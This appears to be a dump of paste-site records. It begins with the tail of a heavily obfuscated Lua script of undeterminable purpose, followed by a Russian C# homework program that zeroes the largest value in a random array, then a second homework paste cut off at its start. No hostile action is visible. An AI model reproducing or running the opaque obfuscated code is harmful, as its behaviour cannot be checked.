o=Z[t[-805212-(-805214)]]J=Z[t[-656811+656814]]K=J(k,F)S=o[K]c=P[E(-895577+888421)]q=O[S]o=H(-740992+4204504,{t[415949-415948]})S=.4 O=q(S,o)q={}end else if c<9760522-(-408923)then q=Z[t[643251+-643250]]S=Z[t[558756+-558754]]J=E(171329-178670)k=27576126764289-819928 K=22610793524225-934625 o=S(J,K)c=q[o]K=E(785020-792214)S=Z[t[1015634-1015633]]o=Z[t[-734844+734846]]J=o(K,k)q=S[J]q={c;q}c=P[E(-106392-(-99511))]else D=D+h i=D<=m z=not d i=z and i z=D>=m z=d and z i=z or i z=13958088-710298 c=i and z i=864580-20065 c=c or i end end else if c<10127664-(-283143)then if c<10084224-(-165949)then F=nil c=-186550+10601713 else n={}x=C()p={}Q=C()I=E(-336103+328969)Z[x]=p p=C()h=nil e=E(474073+-481019)i=nil o=nil k=nil r=V(393162+8422572,{x,m;D,K})Z[p]=r r={}Z[Q]=r M=nil y=E(65681-72836)r=P[e]U=Z[Q]R={[I]=U;[y]=M}e=r(n,R)Z[S]=e F=nil r=v(520715-(-46846),{Q,x,d,m,D,p})o=1.04657150494e+14 i=E(-774155-(-767034))x=L(x)Z[J]=r z=nil Q=L(Q)m=L(m)F=P[i]z=32220284395150-222195 p=L(p)K=L(K)d=L(d)d=E(-749343+741953)D=L(D)m=Z[S]D=Z[J]h=D(d,z)i=m[h]k=F[i]K=k~=o c=K and 3174431-(-40941)or 10751255-(-180454)end else K=nil c=678168+14212076 k=nil end end end end else if c<-908325+12711380 then if c<801312+10186465 then if c<328212+10564869 then if c<808553+9742363 then if c<10011024-(-514489)then h=925072+5841222561040 c=E(86243-93538)D=E(-631916-(-624872))J=S F=Z[t[72285+-72284]]i=Z[t[804824+-804822]]c=K[c]m=i(D,h)k=F[m]c=c(K,k)c=c and 876006+5331348 or 11982048-(-372342)else c=true c=c and-746854+3967695 or-721892+3892402 end else if c<541849+10249915 then c=124286+15266962 g=h==d G=g else S=Z[t[51390+-51388]]o=Z[t[439286-439283]]c=-297719+7964427 O=S==o q=O end end else if c<634197+10319233 then if c<10627875-(-305387)then D=5972453665784-(-286437)k=Z[S]F=Z[J]z=-107793+12966364576934 d=E(578451+-585671)m=E(163852-170745)i=F(m,D)F=E(733048+-740169)K=k[i]k=C()Z[k]=K K=P[F]m=Z[S]D=Z[J]F=E(945475+-952422)h=D(d,z)i=m[h]F=K[F]F=F(K,i)z=E(58752+-65739)i=E(828056-835177)K=P[i]i=E(638367+-645314)D=Z[S]p=33280024987021-(-751356)h=Z[J]d=h(z,p)m=D[d]z=E(274552-281935)i=K[i]i=i(K,m)K=C()p=221506+31441514469359 Z[K]=i D=Z[S]h=Z[J]d=h(z,p)m=D[d]D=E(666585+-673870)i=F[m]d=s(-857203+2153314,{S,J})m=P[D]z={m(d)}d=c m=C()D=z[510389-510388]h=z[-777389-(-777391)]Z[m]=h z=not D h=z c=z and 13130851-136164 or 15507424-842555 else O=Z[t[189060+-189051]]S=E(-803455+796050)S=O[S]S=S(O)c=-209818+12124172 end else K=Z[t[-228885-(-228886)]]c=1266126-390582 i=E(-270339-(-263258))m=-1044416+7422467128640 k=Z[t[720533-720531]]F=k(i,m)J=K[F]o=O[J]S=not o q=S end end else if c<11163879-(-406854)then if c<10278230-(-1021890)then if c<11745741-729653 then c=3432583-812313 else c=q and 16179960-(-404476)or 5620511-(-976350)end else if c<902354+10576508 then K=E(-418189+411068)O=B[-838576+838577]D=-472561+12024271801296 m=E(-286470+279473)J=P[K]k=Z[t[-891763-(-891764)]]F=Z[t[894314-894312]]i=F(m,D)K=k[i]i=E(775914+-783234)o=J[K]K=Z[t[904933-904932]]k=Z[t[-412161-(-412163)]]m=-182472+14734517740437 F=k(i,m)J=K[F]S=o[J]F=E(332061+-339198)J=Z[t[-243427+243428]]i=-667710+10518091301727 K=Z[t[886711+-886709]]k=K(F,i)o=J[k]F=22428072754672-628005 q=S[o]o=Z[t[-809028-(-809029)]]J=Z[t[728340-728338]]k=E(-310749-(-303746))K=J(k,F)S=o[K]k=33714603999757-(-129862)c=q[S]S=Z[t[16157+-16156]]K=E(224369+-231266)o=Z[t[931045-931043]]J=o(K,k)q=S[J]S=O c[q]=S O=nil c=P[E(150832+-157996)]q={}else c=Z[t[-391364+391368]]J={c(O)}S=J[-196986-(-196988)]q=J[-485455+485456]o=J[976801+-976798]K=E(683453-690406)J=q q=P[K]k=Z[t[-667504-(-667505)]]m=E(957319+-964635)D=-220389+2392315322687 F=Z[t[-546098+546100]]i=F(m,D)K=k[i]c=q[K]k=Z[t[263164+-263163]]D=16296709005174-(-949806)F=Z[t[-730532-(-730534)]]m=E(431860+-439087)i=F(m,D)K=k[i]m=E(-106961+99798)q=c(K)K=q k=Z[t[701304-701303]]F=Z[t[953303-953301]]D=585817+13992127654170 i=F(m,D)q=k[i]c=J==q c=c and 7363376-43798 or 538839+12026336 end end else if c<427736+11363207 then if c<-615133+12282794 then E_=Z[S]a_=Z[J]t_=E(-791167+783789)N_=3617112324045-635193 B_=a_(t_,N_)P_=E_[B_]c=2702294-(-358114)c_=y[P_]P_=E(255075-262162)P_=c_[P_]P_=P_(c_)l=P_ else k=E(-443403-(-435996))o=Z[t[622842-622841]]J=Z[t[680633-680631]]m=E(423515-430633)F=34534659459569-(-521440)K=J(k,F)S=o[K]q=O[S]D=5832150009866-(-1016465)K=E(-112563-(-105680))J=P[K]k=Z[t[-414667-(-414668)]]F=Z[t[582471+-582469]]i=F(m,D)K=k[i]o=J[K]K=Z[t[-1019083-(-1019084)]]m=-485175+1563452320271 i=E(-778250-(-771015))k=Z[t[-309577-(-309579)]]F=k(i,m)J=K[F]S=o[J]c=q==S c=c and-419889-(-627830)or 14342769-220117 end else c=P[E(234824+-241834)]q={}end end end else if c<12345591-342155 then if c<11055678-(-873005)then if c<498521+11422701 then if c<-1002548+12844747 then o=E(-647205+640084)O=B[176450-176449]i=831315+5569820089038 S=P[o]m=-806583+4895754213278 J=Z[t[-380432+380433]]F=E(589016+-596404)K=Z[t[-1019687+1019689]]k=K(F,i)i=E(159126+-166287)F=210881+16131997689239 o=J[k]q=S[o]k=E(166645+-173867)o=Z[t[-835738-(-835739)]]J=Z[t[-716846-(-716848)]]K=J(k,F)S=o[K]c=q[S]S=c K=Z[t[-882535+882536]]k=Z[t[602521+-602519]]F=k(i,m)J=K[F]o=S[J]c=o and 740479+-556669 or 402498+8675601 q=o else S=c o=Z[t[-246716-(-246722)]]O=o c=o and 8971218-614438 or-197211+14796023 end else if c<10918409-(-1006890)then I=E(-875961+868857)y=E(238897+-246018)n=P[I]U=P[y]w=Z[S]c_=-388017+34755009506025 Z_=E(-206018+198838)E_=36097+14122231614639 j=E(-459809+452680)A=Z[J]l=A(j,c_)M=w[l]w=E(1006780+-1013670)c_=94774+15313764460965 t_=14740930995502-(-554402)w=U[w]y={w(U,M)}P_=417595+2224111379664 I=n(a(y))n=I()I=C()j=E(-831411-(-824249))Z[I]=n n=Z[I]a_=2583710542685-(-72022)q_=982964+23412104669922 w=Z[S]A=Z[J]l=A(j,c_)M=w[l]U=E(668249+-675374)A=Z[S]c_=E(106896+-114045)C_=E(184889+-191928)l=Z[J]j=l(c_,P_)w=A[j]B_=801313664179-600894 l=Z[S]j=Z[J]P_=E(299780-307094)c_=j(P_,E_)A=l[c_]j=Z[S]E_=E(-833393+826266)c_=Z[J]P_=c_(E_,a_)l=j[P_]c_=Z[S]a_=E(242682+-249760)P_=Z[J]E_=P_(a_,B_)B_=E(612609-619543)j=c_[E_]P_=Z[S]E_=Z[J]a_=E_(B_,t_)U=n[U]T_=E(-51323+44166)N_=10006175701491-(-997440)c_=P_[a_]E_=Z[S]a_=Z[J]t_=E(-320964-(-314061))B_=a_(t_,N_)P_=E_[B_]B_=Z[S]t_=Z[J]N_=t_(T_,q_)q_=49827+7132685355606 a_=B_[N_]B_=false E_={[a_]=B_}B_=Z[S]t_=Z[J]T_=E(943157-950446)N_=t_(T_,q_)a_=B_[N_]B_=false y={[M]=w;[A]=l;[j]=c_,[P_]=E_;[a_]=B_}j=311291+18795510800949 l=E(495516-502418)U=U(n,y)t_=E(344161+-351094)B_=-283797+32783217823798 a_=31895169342492-(-810472)n=E(-1026188+1018928)c_=23588601253013-369069 E_=30335031948649-(-688580)M=Z[S]n=U[n]w=Z[J]A=w(l,j)y=M[A]j=E(-980945+973535)M=nil n=n(U,y,M)w=Z[S]y=E(-1028690-(-1021368))S_=4011912285517-50689 A=Z[J]O_=13977066136734-(-95438)l=A(j,c_)M=w[l]w=true N_=821855+34117375636400 y=n[y]c_=E(-932472+925504)y=y(n,M,w)w=E(-563288+556335)M=P[w]A=Z[S]l=Z[J]P_=-675912+30487863314365 j=l(c_,P_)P_=15053489080731-11834 c_=E(697666+-705011)w=A[j]y=M[w]A=Z[S]l=Z[J]j=l(c_,P_)w=A[j]M=y(w)l=Z[S]P_=E(350367-357720)y=E(431254-438313)j=Z[J]c_=j(P_,E_)A=l[c_]j=Z[S]c_=Z[J]E_=E(500350+-507758)P_=c_(E_,a_)l=j[P_]a_=E(828720+-835898)c_=Z[S]y=n[y]P_=Z[J]E_=P_(a_,B_)j=c_[E_]E_=Z[S]a_=Z[J]B_=a_(t_,N_)P_=E_[B_]a_=Z[p]N_=Z[S]T_=Z[J]q_=T_(Z_,O_)t_=N_[q_]Z_=Z[S]O_=Z[J]o_=O_(C_,S_)q_=Z_[o_]T_=q_..R N_=M..T_ B_=t_..N_ E_=a_..B_ c_=P_..E_ w={[A]=l,[j]=c_}P_=E(162164+-169271)q_=34212748834275-(-313432)y=y(n,w)w=C()N_=-395190+31758130413946 E_=18444854934836-1039271 T_=E(-92786+85503)Z[w]=y l=Z[S]O_=-968928+22853399474801 y=E(895976+-903298)j=Z[J]y=n[y]c_=j(P_,E_)A=l[c_]l=true y=y(n,A,l)A=C()y=false Z[A]=y a_=E(1007069-1014082)c_=Z[S]B_=9638445998814-(-962218)P_=Z[J]E_=P_(a_,B_)t_=380130+28302904583833 j=c_[E_]Z_=23381980240028-683540 P_=Z[S]E_=Z[J]y=E(-267157-(-259984))B_=E(630274+-637180)a_=E_(B_,t_)t_=E(-1022404-(-1015023))y=n[y]c_=P_[a_]E_=Z[S]a_=Z[J]B_=a_(t_,N_)P_=E_[B_]B_=Z[S]E_=false t_=Z[J]N_=t_(T_,q_)a_=B_[N_]q_=E(577971+-584913)t_=Z[S]N_=Z[J]T_=N_(q_,Z_)Z_=E(940811-948077)B_=t_[T_]N_=Z[S]T_=Z[J]q_=T_(Z_,O_)t_=N_[q_]N_=s(3894100-(-269757),{A})l={[j]=c_;[P_]=E_,[a_]=B_;[t_]=N_}B_=E(-14830+7727)t_=21698332427058-(-451654)c_=E(-184838+177717)y=y(n,l)j=P[c_]P_=Z[S]E_=Z[J]a_=E_(B_,t_)c_=P_[a_]l=j[c_]a_=E(764238-771478)c_=Z[S]B_=-78813+14718196797090 P_=Z[J]E_=P_(a_,B_)j=c_[E_]y=l[j]E_=Z[S]t_=E(527466+-534384)j=c a_=Z[J]N_=27596179725043-1026241 B_=a_(t_,N_)P_=E_[B_]c_=y[P_]c=c_ and-257703+3318111 or 470791+11182805 l=c_ else c=Z[t[-366594+366597]]q=c()O=q c=O and 1017109+10531860 or 69695+2558079 end end else if c<11427641-(-560520)then if c<-833873+12794934 then k=E(-48055-(-40934))q=P[k]d=E(59076+-66476)F=Z[t[-260597-(-260598)]]h=22667486898594-(-180121)i=Z[t[349131+-349129]]D=E(-992728+985686)m=i(D,h)D=E(-236765-(-229527))k=F[m]c=q[k]F=Z[t[596380-596379]]g=-846855+251902159996 O=nil z=288648+6351989285893 G=-723172+12017119174335 S=nil h=432841+26304890262800 i=Z[t[-456210-(-456212)]]J=nil m=i(D,h)k=F[m]m=Z[t[433530+-433529]]D=Z[t[-890014-(-890016)]]h=D(d,z)z=E(-974956+967540)i=m[h]p=10290260490326-271775 D=Z[t[-861679-(-861680)]]h=Z[t[-568921-(-568923)]]d=h(z,p)m=D[d]h=Z[t[54932+-54931]]d=Z[t[-437941-(-437943)]]x=431366+9752470371511 p=E(713983-721286)z=d(p,x)K=nil D=h[z]d=Z[t[-562304-(-562305)]]x=E(543842-551012)z=Z[t[-154502+154504]]o=nil p=z(x,G)G=E(-564187-(-557289))h=d[p]z=Z[t[538430-538429]]p=Z[t[190737+-190735]]x=p(G,g)d=z[x]z=-747828-(-747834)q=E(51162+-58105)F={[i]=m,[D]=h;[d]=z}h=-263456+27382251042542 q=c[q]D=E(-804768+797734)q=q(c,k,F)k=E(-25930+18534)q=P[k]F=Z[t[-24613-(-24614)]]i=Z[t[600060-600058]]m=i(D,h)k=F[m]c=q[k]k=269237-269234 q=c(k)c=Z[t[-189675+189682]]q=E(-368842+361437)q=c[q]q=q(c)c=561537+13275663 else i=E(-191532-(-184143))o=Z[t[780601+-780592]]K=Z[t[277866+-277863]]m=21735853314372-(-529989)k=Z[t[194445+-194441]]d=-341484+29744706595846 F=k(i,m)c=-333073+7197004 J=K[F]h=E(5104+-12406)i=Z[t[-172167+172170]]m=Z[t[-895703+895707]]D=m(h,d)F=i[D]k=S[F]F=Z[t[-547587+547597]]K=k*F o[J]=K end else c=138618+10399053 end end else if c<12524321-169842 then if c<12803837-691296 then if c<765378+11259964 then q=E(-1010025+1002731)c=P[q]K=E(164703-171744)o=Z[t[-152466-(-152469)]]K=o[K]J={K(o)}o={c(a(J))}c=325933+5749049 q=o[438783-438782]O=o[1023005+-1023003]S=o[-172989+172992]o=q else k=E(572279+-579340)S=E(-237184-(-229788))c=true Z[t[304318-304317]]=c F=22807144831009-(-414043)O=P[S]o=Z[t[213533+-213531]]J=Z[t[-745685+745688]]K=J(k,F)S=o[K]q=O[S]o=V(509757+351047,{t[887043+-887042]})S=.4 c=P[E(706795+-714044)]O=q(S,o)q={}end else if c<12849839-510515 then c=D q=m c=m and 7219835-1019794 or 16092816-599409 else c=6606289-531307 K=nil J=nil end end else if c<12347349-(-158713)then if c<12060386-(-375464)then A=Z[S]c=w P_=476426+4742779716502 c_=E(-187975+180833)l=Z[J]Q=E(316681-323624)j=l(c_,P_)Q=p[Q]w=A[j]A=-357108+357114 q={}R={[I]=U;[y]=M;[w]=A}Q=Q(p,n,R)c=P[E(485033-492392)]else c=P[E(230183-237544)]q={}end else c=X(9184649-634284,{J})g={c()}q={a(g)}c=P[E(760764-768070)]end end end end end else if c<15379773-737670 then if c<-507154+14054768 then if c<-743315+13688668 then if c<12066299-(-657590)then if c<13249585-613751 then if c<13171618-624480 then q=false c=15442376-551486 Z[t[-1010359-(-1010363)]]=q else m=E(745070-752363)k=Z[t[920902-920901]]D=31782148016739-823444 F=Z[t[284128+-284126]]i=F(m,D)q=k[i]c=J==q c=c and-1008822+12939168 or 12495774-(-803637)end else if c<12609895-(-29126)then J=Z[t[636957+-636956]]K=Z[t[-671550+671552]]i=814614+23746342567195 h=-540816+11528917079432 F=E(952944-960199)k=K(F,i)D=E(687182+-694060)o=J[k]S=O[o]k=E(92678+-99561)K=P[k]F=Z[t[-199270-(-199271)]]i=Z[t[-971573-(-971575)]]m=i(D,h)D=1822314545209-(-983831)k=F[m]J=K[k]k=Z[t[201890-201889]]F=Z[t[-710913+710915]]m=E(1011033-1018199)i=F(m,D)K=k[i]o=J[K]q=S==o c=q and-279909+12795620 or 174741+14716149 else i=E(-379899+372946)F=P[i]m=Z[t[235843+-235842]]d=E(598004+-605272)z=23355177409430-176411 D=Z[t[-367192+367194]]h=D(d,z)i=m[h]c=F[i]z=63510+31442349998363 m=Z[t[-213646-(-213647)]]D=Z[t[-715427-(-715429)]]d=E(-788324+781011)h=D(d,z)i=m[h]F=c(i)x=6746430965227-(-788058)p=E(946451+-953659)h=Z[t[566205+-566204]]d=Z[t[-417609-(-417611)]]z=d(p,x)D=h[z]m=k[D]c=m and-595739+13559210 or 10227490-922122 i=m end end else if c<12847596-14716 then if c<127380+12673243 then c=P[E(-290028-(-282798))]q={}else S=Z[t[636251+-636248]]o=300946-300774 O=S*o S=255084+-254827 c=-354001+4367592 q=O%S Z[t[15195-15192]]=q end else if c<12526691-(-381237)then y=E(-1003382+996261)I=E(772199+-779303)o_=30719689708173-(-1025363)n=P[I]U=P[y]w=Z[S]A=Z[J]B_=-842700+15847993948319 c_=15598858208162-(-6333)j=E(707354+-714738)l=A(j,c_)M=w[l]w=E(-957411+950521)w=U[w]y={w(U,M)}j=-159736+20165811410086 I=n(a(y))c_=575887+14025468514292 T_=13276718906452-(-465874)P_=27575165089435-459891 l=E(-790175-(-783113))n=I()M=Z[S]w=Z[J]A=w(l,j)j=E(798574-805514)y=M[A]w=Z[S]A=Z[J]l=A(j,c_)I=E(-185321+178196)E_=11720059983419-721130 M=w[l]A=Z[S]c_=E(-665425+658456)l=Z[J]j=l(c_,P_)w=A[j]a_=33032075822756-838287 N_=E(355119+-362312)l=Z[S]j=Z[J]P_=E(494119+-501069)c_=j(P_,E_)A=l[c_]j=Z[S]E_=E(-949279-(-941908))t_=2148276804816-(-157464)c_=Z[J]P_=c_(E_,a_)l=j[P_]c_=Z[S]P_=Z[J]a_=E(216009-223342)E_=P_(a_,B_)B_=E(-706862-(-699489))j=c_[E_]P_=Z[S]E_=Z[J]a_=E_(B_,t_)c_=P_[a_]a_=Z[S]B_=Z[J]t_=B_(N_,T_)N_=E(-9176+1849)E_=a_[t_]Z_=-832162+3265192114322 q_=E(497041+-504186)a_=false P_={[E_]=a_}T_=787014+25856674655426 a_=Z[S]I=n[I]B_=Z[J]t_=B_(N_,T_)E_=a_[t_]a_=false U={[y]=M;[w]=A,[l]=j,[c_]=P_,[E_]=a_}I=I(n,U)M=Z[S]w=Z[J]j=22321200300628-(-632390)l=E(-825672+818575)P_=867471+24478433456119 A=w(l,j)c_=E(410248+-417587)B_=E(-452915+445578)t_=109355+3286190365391 U=E(26933-34193)U=I[U]y=M[A]E_=610436+28248989934302 M=nil U=U(I,y,M)A=Z[S]a_=3433539566441-783659 l=Z[J]j=l(c_,P_)w=A[j]P_=E(-294204-(-286965))l=Z[S]j=Z[J]c_=j(P_,E_)O_=E(878146+-885209)A=l[c_]j=Z[S]c_=Z[J]E_=E(-82515+75102)P_=c_(E_,a_)l=j[P_]P_=Z[S]E_=Z[J]a_=E_(B_,t_)c_=P_[a_]E_=Z[p]t_=Z[S]N_=Z[J]I=nil T_=N_(q_,Z_)B_=t_[T_]T_=Z[S]y=E(910838+-917897)q_=Z[J]Z_=q_(O_,o_)N_=T_[Z_]y=U[y]t_=R..N_ a_=B_..t_ P_=E_..a_ j=c_..P_ M={[w]=A;[l]=j}P_=7527293710490-942825 y=y(U,M)A=Z[S]l=Z[J]c=-434289+1855391 c_=E(177227+-184490)j=l(c_,P_)w=A[j]E_=377839+13855094871364 P_=E(923872+-931057)a_=6924577593578-592978 l=Z[S]j=Z[J]c_=j(P_,E_)A=l[c_]E_=E(512405-519383)j=Z[S]c_=Z[J]P_=c_(E_,a_)l=j[P_]j=Z[m]y=E(-75715-(-68656))a_=143328+29592063935987 y=U[y]c_=E(545593-552962)P_=-976582+17022547772860 M={[w]=A,[l]=j}y=y(U,M)A=Z[S]l=Z[J]j=l(c_,P_)w=A[j]E_=10452870751191-413908 l=Z[S]y=E(512666+-520070)j=Z[J]y=U[y]P_=E(760059+-767292)c_=j(P_,E_)A=l[c_]n=nil j=Z[S]E_=E(-225464-(-218373))c_=Z[J]P_=c_(E_,a_)l=j[P_]j=X(-825217+8893047,{m})M={[w]=A;[l]=j}y=y(U,M)U=nil else c=717205+6146407 p=x n=p z[p]=n p=nil end end end else if c<612772+12659668 then if c<-229901+13282706 then if c<-684893+13651096 then x=E(554562+-561552)d=Z[t[-545601-(-545602)]]G=-513439+1407308027950 z=Z[t[-1005044+1005046]]p=z(x,G)h=d[p]D=k[h]m=D>=F i=m c=-98726+9404094 else c=d c=h and 8572061-481302 or 14813847-(-716323)end else if c<340863+12901472 then r=-1042404-(-1042404)x=#z p=x==r c=p and 9261081-(-989401)or 699788+1139666 else i=D u=E(-1038557-(-1031417))g=P[u]c=10087371-(-98902)u=E(813453+-820859)G=g[u]g=G(O,i)G=Z[t[376841-376835]]u=G()x=g+u p=x+k x=1010920-1010664 i=nil u=606384+-606383 z=p%x k=z x=o[S]g=k+u G=J[g]p=x..G o[S]=p end end else if c<698465+12806356 then if c<-492578+13791537 then q=E(-656073-(-648952))c=P[q]O=Z[t[-684498-(-684499)]]S=E(531818+-538708)S=c[S]q={S(c,O)}q={a(q)}c=P[E(-152144+144920)]else S=nil o=nil c=3668163-1040389 J=nil K=nil end else O=q c=O and 4247328-215285 or 15772717-(-518432)end end end else if c<770973+13342381 then if c<14379781-620483 then if c<676586+12900226 then if c<14546357-989196 then O=B[-478533-(-478534)]F=3508181392124-824475 o=Z[t[-676159-(-676160)]]D=10254959995140-333405 J=Z[t[-1006649+1006651]]k=E(518234+-525568)K=J(k,F)S=o[K]q=O[S]K=E(-37608+30725)J=P[K]k=Z[t[-943445-(-943446)]]m=E(-980003+972693)F=Z[t[-442806+442808]]i=F(m,D)m=934498+30870735615429 K=k[i]o=J[K]i=E(-473143+465961)K=Z[t[-512909-(-512910)]]k=Z[t[-14480-(-14482)]]F=k(i,m)J=K[F]S=o[J]c=q==S c=c and-968239+12643089 or-894072+3651286 else O=Z[t[908923+-908922]]c=O and-269093+7680334 or 6700107-(-271983)q=O end else if c<14640809-1008317 then S=nil J=nil o=nil q={}O=nil c=P[E(-866999-(-859793))]else q=J c=14420946-(-686024)end end else if c<-272206+14285951 then if c<238770+13586144 then q=E(-619547-(-612467))O=E(-821208+814278)c=P[q]q=P[O]O=E(-670337-(-663407))P[O]=c O=E(-689678+682598)P[O]=q O=Z[t[467138+-467137]]S=O()c=15467689-79096 else c=P[E(738749+-745899)]q={}end else c=p c=871119+12123568 h=z end end else if c<14134967-(-262906)then if c<-1002381+15126681 then if c<13822170-(-299747)then c=15793981-(-836096)else J=Z[t[-100334+100335]]K=Z[t[141521+-141519]]i=7017715768037-953890 D=E(999657-1006801)F=E(171667-178674)k=K(F,i)o=J[k]h=15424625219231-260753 S=O[o]k=E(472099-478982)K=P[k]F=Z[t[227605-227604]]i=Z[t[954469-954467]]m=i(D,h)k=F[m]J=K[k]m=E(-54653-(-47607))k=Z[t[139655+-139654]]F=Z[t[155782-155780]]D=-458081+14865656469611 i=F(m,D)K=k[i]o=J[K]q=S==o c=q and-378810+6739591 or-976270+6517931 end else if c<13579285-(-653285)then c=true c=-695679+13208261 else S=455435+-455434 c={}o=Z[t[538946+-538937]]O=c c=817088+2583670 J=o o=-469582-(-469583)K=o o=-391903+391903 k=K<o o=S-K end end else if c<250905+14368606 then if c<575132+13996082 then q=K c=k c=133429+8681218 else c=S c=O and-72152+15065760 or 10902810-(-898797)end else S=E(116066-123187)O=P[S]o=Z[t[651164-651163]]k=E(696602-703582)J=Z[t[-326937+326939]]F=878338+23917435257983 K=J(k,F)S=o[K]q=O[S]S=Z[t[354805-354804]]K=E(-1040421-(-1033143))i=3963608437264-674523 k=7889430920377-(-741792)o=Z[t[116202+-116200]]J=o(K,k)O=S[J]c=q[O]O=c J=Z[t[95679-95678]]K=Z[t[636099+-636097]]F=E(-87444-(-80199))k=K(F,i)o=J[k]S=O[o]c=S and 6175458-(-707703)or-85571+6357542 q=S end end end end else if c<15387267-(-373929)then if c<830611+14202397 then if c<-734565+15623206 then if c<-146363+14859753 then if c<13905575-(-759319)then p=c r=Z[m]x=not r z=x c=x and 492800+13612674 or 3196413-401635 else q={}c=P[E(981356+-988438)]end else if c<967208+13913278 then O=B[-74431-(-74432)]S=not O q=S c=S and 536906-(-338638)or 93510+10874567 else c=true c=c and 11422417-(-578021)or-659433+13172015 end end else if c<939706+13966467 then if c<805713+14084943 then o,k=J(S,o)c=o and 422246+7216083 or 567844+6501970 else c=-865626+1918748 end else F=10989441421080-(-574693)k=E(309974-317126)O=Z[t[-20521-(-20527)]]o=Z[t[-427196-(-427199)]]J=Z[t[181299-181295]]K=J(k,F)c=12569492-767885 S=o[K]o=false O[S]=o end end else if c<686693+14779005 then if c<-8291+15397356 then if c<83316+15119635 then c=K c=not q c=c and 977808+1101550 or 244022+8043157 else c=true c=c and-347608+14164126 or 327949+7442387 end else if c<16400967-992016 then Z[S]=G c=Z[S]c=c and 791193+5519024 or-1011083+15142005 else m=28616752170130-(-438139)c=o i=E(-260531+253347)o=q D=27546616142143-(-792796)K=Z[t[-907089+907091]]k=Z[t[-840759-(-840762)]]F=k(i,m)q=E(-733445+726333)q=o[q]J=K[F]q=q(o,J)J=C()Z[J]=q q=E(259243+-266525)k=Z[t[660327-660325]]F=Z[t[2685-2682]]m=E(985480+-992832)q=o[q]i=F(m,D)K=k[i]k=c q=q(o,K)K=C()Z[K]=q i=Z[J]F=not i c=F and-549595+16915263 or-819658+8878678 q=F end end else if c<15165248-(-511464)then if c<14904526-(-596788)then D=E(-650036-(-643145))m=P[D]q=m c=5500106-(-699935)else p=X(441189+14431801,{S;J,m})d=C()z=H(-988661+8615925,{k;S,J,K})Z[d]=z z=C()Z[z]=p p=Z[d]Q={p()}x=Q[-202299+202300]p=not x c=p and 966139+7286725 or-525049+6640543 r=Q[659597+-659595]end else q=-476207+15353062 S=E(643353-650653)o=793637+147379 O=S^o c=q-O q=E(-392777+385747)O=c c=q/O q={c}c=P[E(-546658+539629)]end end end else if c<15889490-(-409171)then if c<15617963-(-282802)then if c<505583+15326369 then if c<16488229-692591 then z=E(465349-472253)d=P[z]c=-393253+12523132 z=E(546655-553546)h=d[z]m=h else q=Z[t[-918716-(-918720)]]i=E(-425430-(-418025))i=q[i]i=i(q)c=17311961-610777 end else if c<16454589-593741 then c=692792+4284812 S=E(-814548-(-807143))O=Z[t[712835-712830]]S=O[S]S=S(O)else A=448338+-448336 c=6897149-(-546757)w=y[A]A=Z[U]M=w==A b=M end end else if c<525618+15725152 then if c<23817+15956860 then q=E(861116+-868101)m=H(814487+6880739,{})i=E(-824271+816986)c=P[q]J=E(290655-297905)O=Z[t[664881+-664877]]o=P[J]F=P[i]i={F(m)}k={a(i)}F=-671784-(-671786)K=k[F]J=o(K)o=E(622022+-629136)S=O(J,o)O={S()}q=c(a(O))S=Z[t[553585-553580]]O=q c=S and-618296+6863289 or 3533023-246766 q=S else K=E(-272088-(-265039))q=E(-46105-(-39185))O=B[-2130+2131]c=P[q]S=Z[t[-776136+776137]]k=-479477+3926597982233 o=Z[t[198575+-198573]]J=o(K,k)i=18458870360475-(-636920)q=S[J]F=E(-698756-(-691871))o=E(357160-364080)S=O c[q]=S S=P[o]J=Z[t[-314918-(-314919)]]K=Z[t[98083-98081]]k=K(F,i)o=J[k]q=S[o]S=nil c=q==S c=c and 9724104-313934 or 180879+4879869 end else O=nil c=-689074+13162992 end end else if c<17403167-771927 then if c<15515225-(-950541)then if c<15333992-(-987944)then c=12748583-394017 l=Z[S]E_=26520590301563-1034558 P_=E(-1035636-(-1028680))j=Z[J]c_=j(P_,E_)A=l[c_]M=A else c=k c=q and 6436207-1008604 or-777870+1260889 end else if c<1022272+15582896 then F=22454317231947-(-932237)O=Z[t[-704281-(-704283)]]J=Z[t[-681247+681250]]k=E(-925178+917906)c=nil K=J(k,F)q=O[K]q={c,q}c=P[E(-317447+310311)]else O=E(-893325-(-885929))q=P[O]S=Z[t[-935352-(-935353)]]o=Z[t[-329270+329272]]k=7725571574923-409214 K=E(-209178-(-202161))J=o(K,k)O=S[J]c=q[O]O=.1 q=c(O)c=q and 11315232-(-689367)or-683557+13411414 end end else if c<432935+16253677 then if c<16108164-(-559413)then J=L(J)O=nil K=L(K)q={}o=nil c=P[E(-631256+623944)]S=nil else O=Z[t[633915-633910]]c=O and 16586483-743878 or 5095510-117906 end else q=Z[t[-709139-(-709144)]]c=q and-375220+1804917 or 457881-(-105748)end end end end end end end end c=#N return a(q)end,function()S=(-359657+359658)+S O[S]=-330953-(-330954)return S end,function(P,E)local a=o(E)local B=function()return c(P,{},E,a)end return B end,function(P,E)local a=o(E)local B=function(...)return c(P,{...},E,a)end return B end,function(P)O[P]=O[P]-(359348+-359347)if O[P]==137575-137575 then O[P],Z[P]=nil,nil end end,function(P,E)local a=o(E)local B=function(B,t,N,T,q)return c(P,{B;t;N;T,q},E,a)end return B end,function(P,E)local a=o(E)local B=function(B,t,N,T,q,Z,O)return c(P,{B,t,N;T,q,Z;O},E,a)end return B end return(K(3137442-992452,{}))(a(q))end)(getfenv and getfenv()or _ENV,unpack or table[E(575354-582245)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
9Fz0AsG1,ДЗ: Наибольший элемент,NikaBang,C#,Sunday 19th of October 2025 04:34:34 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int[,] array = new int[10, 10];
        int maxValue = 0;
        int newValueForMax = 0;
        int minRandom = 1;
        int maxRandom = 10;
        Random random = new Random();
        Console.WriteLine(""Исходный массив:"");

        for (int i = 0; i < array.GetLength(0); i++)
        {
            for (int j = 0; j < array.GetLength(1); j++)
            {
                array[i, j] = random.Next(minRandom, maxRandom);
                Console.Write(array[i, j] + "" "");
                
                if(maxValue <  array[i, j])
                {
                    maxValue = array[i, j];
                }
            }
            Console.WriteLine();
        }

        Console.WriteLine(""\nИзменненый массив:"");

        for (int i = 0; i < array.GetLength(0); i++)
        {
            for (int j = 0; j < array.GetLength(1); j++)
            {
                if (maxValue == array[i, j])
                {
                    array[i, j] = newValueForMax;
                }

                Console.Write(array[i, j] + "" "");
            }
            Console.WriteLine();
        }
    }
}"
a6RmEUXA,ДЗ: Работа с конкретными строками/столбцами,NikaBang,C#,Sunday 19th of October 2025 04:15:25 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
